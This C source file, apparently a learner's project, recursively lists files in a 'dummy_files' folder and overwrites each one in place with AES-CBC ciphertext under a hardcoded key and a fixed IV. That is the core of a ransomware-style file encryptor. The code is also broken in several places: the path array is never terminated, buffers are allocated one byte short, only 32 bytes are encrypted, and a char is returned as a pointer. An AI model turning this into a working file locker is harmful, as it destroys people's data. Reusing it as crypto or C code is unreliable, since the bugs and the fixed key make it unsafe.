#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <stdbool.h>

/*
   This implementation of the Advanced Encryption Standard automatically pads and unpads
   input for you, if it's not divisible by the block size :)
   Source: https://github.com/kokke/tiny-AES-c 
*/
#include "tiny-AES-c/aes.h"

// d_type = 4 -> directory
// d_type = 8 -> file
#define E_FOLDER 4
#define E_FILE 8
const char *FILES_TO_ENCRYPT = "dummy_files";
const uint8_t ENCRYPTION_KEY[] = "NFTs_are_a_scam";
const uint8_t IV[]  = "fffffffffffffff";  // initializer vector. Should be random.

char **find_files(const char *dir_name)
{
    int amount_to_encrypt = 10;
    int i = 0;
    char **file_paths = malloc(amount_to_encrypt * sizeof(char*));
    DIR *dir = opendir(dir_name);

    if (dir == NULL) {
        return '\0';
    }
    
    struct dirent *entity;
    entity = readdir(dir);
    while (entity != NULL) {
        // build path string
        char relative[255] = {0};
        strcat(relative, dir_name);
        strcat(relative, "/");
        strcat(relative, entity->d_name);

        // if the entity is a folder, call the function recursively
        if (entity->d_type == E_FOLDER && strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0) {
            find_files(relative);
        } else if (entity->d_type == E_FILE) {
            //printf("%d %s\n", entity->d_type, relative);
            /*
                Currently does not work recursively.
                It should work as the relative string when printing prints recursively.
                printf("%s\n", relative); will print recursively into folders,
                but when adding the relative string to file_paths it goes missing.
                I do not understand for the life of me what I'm doing wrong.
                I will come back to this when I'm not as much of a C noob as I am now.
            */
            if (i < amount_to_encrypt) {
                file_paths[i] = malloc(sizeof(char) * strlen(relative));
                strcpy(file_paths[i], relative);
                i++;
            }
        }
        // move to next entity
        entity = readdir(dir);
    }

    closedir(dir);
    return file_paths;
}

long find_file_len(char *file_name)
{
    FILE *fileptr;
    long filelen;
    // open the file in binary mode
    fileptr = fopen(file_name, "rb");

    // redundant check is we know from find_files this file must exist
    //if (fileptr == NULL) {
    //    return -1;
    //}
    // Jump to the end of the file, get offset, then jump back
    fseek(fileptr, 0, SEEK_END);
    filelen = ftell(fileptr);
    fclose(fileptr);
    return filelen;
}

char *read_file(long filelen, char *file_name)
{
    FILE *fileptr;
    char *buffer;

    // open the file in binary mode
    fileptr = fopen(file_name, "rb");

    // redundant check is we know from find_files this file must exist
    //if (fileptr == NULL) {
    //    return '\0';
    //}

    buffer = malloc(filelen);
    fread(buffer, filelen, 1, fileptr); 
    fclose(fileptr);
    return buffer;
}

int main()
{
    // init AES
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, ENCRYPTION_KEY, IV);

    // array of strings contain relative path to the files to be encrypted
    char **files = find_files(FILES_TO_ENCRYPT);
    char i = 1;
    // TO-DO: add arg when running to choose between encrypting or decrypting
    bool encrypt = true;

    if (files == NULL) {
        printf("No files to encrypt\n");
        exit(1);
    }

    while (*files) {
        long filelen = find_file_len(*files);
        if (filelen == 0) {
            printf("File '%s' is empty, skipping it\n", *files);
            files++;
            continue;
        }

        char *data = read_file(filelen, *files);
                
        //  write to file
        FILE *fileptr;
        // testing name for testing purposes
        //char test_name[255] = {0};
        //strcat(test_name, *files);
        //strcat(test_name, ".changed");
        //printf("%s\n", test_name);
        fileptr = fopen(*files, "wb+");

        if(fileptr == NULL) {
            printf("file couldn't be opened\n");
            exit(1);
        }

        if (encrypt)
            AES_CBC_encrypt_buffer(&ctx, data, 32);
        else
            AES_CBC_decrypt_buffer(&ctx, data, 32);

        size_t count = fwrite(data, 1, filelen, fileptr);
        printf("Name: %s, File len: %ld, Bytes written : %ld\n", *files, filelen, count);

        fclose(fileptr);
        free(data);
        i++;
        files++;
 
    }
}
